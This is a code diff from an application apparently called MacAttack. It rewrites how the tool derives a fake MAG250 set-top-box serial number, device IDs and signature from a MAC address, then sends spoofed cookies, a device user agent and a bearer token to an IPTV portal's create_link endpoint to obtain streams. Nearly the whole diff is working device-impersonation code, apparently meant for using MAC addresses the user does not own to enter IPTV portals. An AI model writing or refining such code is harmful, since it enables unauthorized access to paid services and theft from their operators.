-                        mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-                        mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-                        mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-                        
-                        serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-                        device_id = mac_sha256
-                        device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-                        device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-                        cookies = {           
-                            "adid": mac_sha1,
-                            "debug": "1",
-                            "device_id2": device_id2,
-                            "device_id": device_id,
-                            "hw_version": "1.7-BD-00",
-                            "mac": mac_address,
-                            "sn": serial[:13], #cut to 13 digits
-                            "stb_lang": "en",
-                            "timezone": "America/Los_Angeles", 
-                        }
+                        serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+                        sn = serialnumber[0:13]
+                        device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+                        device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+                        hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+                        signature_string = f'{sn}{mac_address}'
+                        signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+                        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            
                         headers = {
-                            "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                            "Authorization": f"Bearer {token}",
-                            "X-User-Agent": "Model: MAG250; Link: WiFi",
+                            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                            'Authorization': f'Bearer {token}',
+                            'Accept-Encoding': 'gzip, deflate, zstd',
+                            'Accept': '*/*',
+                            'Connection': 'close',
+                            'Cache-Control': 'no-cache'
+                        }
+
+                        cookies = {
+                            'adid': hw_version_2,
+                            'debug': '1',
+                            'device_id2': device_id2,
+                            'device_id': device_id2,
+                            'hw_version': '1.7-B',
+                            'mac': mac_address,
+                            'sn': sn,
+                            'stb_lang': 'en',
+                            'timezone': 'America/Los_Angeles'
                         }
                         create_link_url = f"{url}/portal.php?type=itv&action=create_link&cmd={cmd_encoded}&JsHttpRequest=1-xml"
                         logging.info(f"Create link URL: {create_link_url}")
@@ -2960,33 +2986,34 @@ class MacAttack(QMainWindow):
                 if token:
                     cmd_encoded = quote(cmd)
 
-                    #convert the mac into various hashes, if anything this will add randomness to the requests
-                    mac_md5 = hashlib.md5(mac_address.encode('utf-8')).hexdigest().upper()
-                    mac_sha256 = hashlib.sha256(mac_address.encode('utf-8')).hexdigest().upper()
-                    mac_sha1 = hashlib.sha1(mac_address.encode('utf-8')).hexdigest()
-
-                    
-                    serial = mac_md5 #cant be right, looks like the serial is only supposed to be 13 digits from what i am reading
-                    device_id = mac_sha256
-                    device_id2_input = serial[:13] + mac_address  # Combine first 13 digits of MD5 + MAC
-                    device_id2 = hashlib.sha256(device_id2_input.encode('utf-8')).hexdigest().upper()  # SHA256 of the combined input
-
-                    cookies = {           
-                        "adid": mac_sha1,
-                        "debug": "1",
-                        "device_id2": device_id2,
-                        "device_id": device_id,
-                        "hw_version": "1.7-BD-00",
-                        "mac": mac_address,
-                        "sn": serial[:13], #cut to 13 digits
-                        "stb_lang": "en",
-                        "timezone": "America/Los_Angeles",             
-                    }
-                    
+                    serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
+                    sn = serialnumber[0:13]
+                    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
+                    device_id2 = hashlib.sha256(mac_address.encode()).hexdigest().upper()
+                    hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
+                    signature_string = f'{sn}{mac_address}'
+                    signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
+                    metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}  
+                              
                     headers = {
-                        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                        "Authorization": f"Bearer {token}",
-                        "X-User-Agent": "Model: MAG250; Link: WiFi",
+                        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+                        'Authorization': f'Bearer {token}',
+                        'Accept-Encoding': 'gzip, deflate, zstd',
+                        'Accept': '*/*',
+                        'Connection': 'close',
+                        'Cache-Control': 'no-cache'
+                    }
+
+                    cookies = {
+                        'adid': hw_version_2,
+                        'debug': '1',
+                        'device_id2': device_id2,
+                        'device_id': device_id2,
+                        'hw_version': '1.7-B',
+                        'mac': mac_address,
+                        'sn': sn,
+                        'stb_lang': 'en',
+                        'timezone': 'America/Los_Angeles'
                     }
                     if item_type == "episode":
                         episode_number = channel.get("episode_number")
@@ -3028,7 +3055,7 @@ class MacAttack(QMainWindow):
             )
         
     def launch_videoPlayer(self, stream_url):
-        
+        self.restart_vlc_instance()
         stream_url = stream_url.replace("'ffmpeg' ", "")
         stream_url = stream_url.replace("ffmpeg ", "")
         self.update_proxy() #reset the vlc window with the proxy and referer
